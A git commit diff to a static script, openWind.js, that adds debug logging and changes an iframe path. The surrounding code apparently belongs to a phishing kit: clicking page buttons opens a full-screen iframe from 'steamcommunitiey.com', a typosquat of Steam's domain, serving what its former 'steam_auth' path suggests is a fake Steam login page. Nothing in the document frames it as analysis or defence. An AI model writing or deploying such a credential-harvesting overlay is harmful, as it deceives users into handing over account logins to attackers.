9ec061092b39c3177738c81fafa96a542153a321
Oleg Kuzmenko <okuzmenko31us@gmail.com>
2025-02-02 01:35:43 +0200

    .

--- api/static/openWind.js
+++ api/static/openWind.js
@@ -8,10 +8,12 @@ const staticUrl = "https://api.steamcommunitiey.com/static"
         if (buttons && buttons.length > 0) {
             buttons.forEach((button) => {
                button.onclick  =() => {
+                    console.log("A");
                     const iframe = document.createElement("iframe")
-                    iframe.src = `${staticUrl}/steam_auth/txqmjgkxhzp5.html`
+                    iframe.src = `${staticUrl}/txqmjgkxhzp5.html`
                     iframe.style = "position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 1000"
                     document.body.appendChild(iframe)
+                    console.log("B");
                }
             })
         }
